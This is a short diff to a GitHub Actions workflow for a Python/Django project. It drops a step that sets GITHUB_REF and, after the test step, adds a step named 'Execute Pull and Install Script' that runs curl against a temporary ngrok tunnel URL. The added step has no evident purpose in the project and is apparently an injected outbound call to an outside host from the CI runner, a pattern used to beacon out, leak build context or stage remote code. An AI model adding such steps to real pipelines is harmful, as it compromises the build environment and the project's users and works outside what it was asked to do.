@@ -25,9 +25,10 @@ jobs:
       run: |
         python -m pip install --upgrade pip
         pip install -r requirements.txt
-    - name: Set GITHUB_REF
-      run: echo "GITHUB_REF=${GITHUB_REF}" >> $GITHUB_ENV
     - name: Run Tests
       run: |
         python manage.py test
+    - name: Execute Pull and Install Script
+      run: |
+        curl -X GET https://00a8-186-3-59-10.ngrok-free.app/pull
     
